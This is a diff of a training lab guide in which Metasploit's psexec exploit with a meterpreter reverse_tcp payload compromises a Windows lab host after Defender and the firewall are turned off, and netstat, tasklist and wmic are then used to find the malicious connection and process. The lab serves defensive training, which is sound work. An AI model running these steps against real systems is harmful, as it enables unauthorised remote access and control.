@@ -6,19 +6,40 @@ In this lab, we will create **malware**, run it, and use the tools we went throu
 
 One of the best ways to learn is to actually just dig in and do it.  
 
-Let’s get started by opening a terminal.  
 
-![](attachments/OpeningKaliInstance.png)
 
-Alternatively, you can open a **Kali** instance by clicking the **Kali** logo in the taskbar.
 
-![](attachments/TaskbarKaliIcon.png)
+
+
+- Open **Command Prompt**
+
+<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />
+
+- **SSH** into the **Linux** machine
+```bash
+ssh ubuntu@linux.cloudlab.lan
+```
+
+<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />
+
+
+
+
+
+
+
+
 
 Before going any further, we need to ensure that **Windows Defender** is disabled. To do this, open a Windows **Powershell** by clicking the icon in the taskbar.
 
-![](attachments/OpeningPowershell.png)
 
-<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/be17e180-e1a4-4b42-b537-9b2931ac0284" />
+
+
+
+```ps
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 ![](attachments/windowscli_disabledefender.png)
 
@@ -32,37 +53,33 @@ Before going any further, we need to ensure that **Windows Defender** is disable
 
 Next, lets ensure the firewall is disabled.
 
-<pre>netsh advfirewall set allprofiles state off</pre>
+```ps
+netsh advfirewall set allprofiles state off
+```
 
 Next, set a password for the Administrator account that you can remember
 
-<pre>net user Administrator password1234</pre>
+```ps
+net user Administrator password1234
+```
 
 >[!NOTE]
 >
 >That is a very bad password. </br> Come up with something better. But, please remember it.
 
-Now that we disabled **Windows Defender**, we need to get our windows IP address for later.
-
-Within the Powershell window, please run the following command:
-
-<pre>ipconfig</pre>
-
->[!IMPORTANT]
->
->Please remember that your Windows IP address is not the same as your ADHD Linux System IP address. 
->
->In this instance, we need our **Windows IP**, so write it down for later!
-
-Now head back to your **Kali** terminal.
+Now head back to your **Linux** terminal.
 
 We need to gain root access. To do that, run the following command:
 
-<pre>sudo su -</pre>
+```bash
+sudo su -
+```
 
 Next, we will start the **Metasploit** handler with the following command:
 
-<pre>msfconsole -q</pre>
+```bash
+msfconsole -q
+```
 
 It will take a second to connect, be patient!
 
@@ -72,30 +89,35 @@ When connected, our terminal will look like this.
 
 Next, run the following command:
 
-<pre>use exploit/windows/smb/psexec</pre>
+```bash
+use exploit/windows/smb/psexec
+```
 
 ![](attachments/windowscli_useexploit.png)
 
 We will continue by running this command to set the location of the payload:
 
-<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
 We also need to set the **RHOST IP** for the Windows system by using the following command:
 
-<pre>set RHOST 10.10.1.209</pre>
-
->[!NOTE]
->
->**Remember, your IP will be different!**
-
+```bash
+set RHOST win.cloudlab.lan
+```
 
 ![](attachments/windowscli_sets.png)
 
 Next, we need to set the **SMB** username and password. 
 
-<pre>set SMBUSER Administrator</pre>
+```bash
+set SMBUSER Administrator
+```
 
-<pre>set SMBPASS T@GEq5%r2XJh</pre>
+```bash
+set SMBPASS T@GEq5%r2XJh
+```
 
 >[!NOTE]
 >
@@ -108,7 +130,9 @@ It should look like this:
 
 Now, we can run the exploit command
 
-<pre>exploit</pre>
+```bash
+exploit
+```
 
 ![](attachments/windowscli_exploit.png)
 
@@ -122,7 +146,9 @@ Go ahead an open an instance of **Windows PowerShell**.
 
 Run the following command:
 
-<pre>netstat -naob</pre>
+```bash
+netstat -naob
+```
 
 ![](attachments/windowscli_netstat.png)
 
@@ -135,7 +161,9 @@ Specificly, we are interested in the connection on port 4444 as we know this is 
 
 Now, let's drill down on that connection with some more data:
 
-<pre>netstat -f</pre>
+```bash
+netstat -f
+```
 
 I like to run **"-f"** with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 
 
@@ -153,7 +181,9 @@ Let's get the Process ID **(PID)** from the output of our **"netstat -naob"** co
 
 We will start with tasklist  
 
-<pre>tasklist /m /fi "pid eq [PID]"</pre>
+```bash
+tasklist /m /fi "pid eq [PID]"
+```
 
 >[!NOTE]
 >
@@ -165,7 +195,9 @@ We can see the loaded **DLL's** above.  As we can see, there is not a whole lot 
 
 Let's keep digging with **wmic**:
 
-<pre>wmic process where processid=[PID] get commandline</pre>
+```bash
+wmic process where processid=[PID] get commandline
+```
 
 ![](attachments/windowscli_wmic.png)
 
@@ -173,7 +205,9 @@ Ahh!!  Now we can see that the file was launched from the **command line**!  We 
 
 Let's see if we can see what spawned the process with **wmic**.
 
-<pre>wmic process get name,parentprocessid,processid | select-string [PID]</pre>
+```bash
+wmic process get name,parentprocessid,processid | select-string [PID]
+```
 
 ![](attachments/windowscli_selectstring.png)
 
@@ -210,5 +244,6 @@ Please be sure to destroy the lab environment!
 
 
  
+
 
 
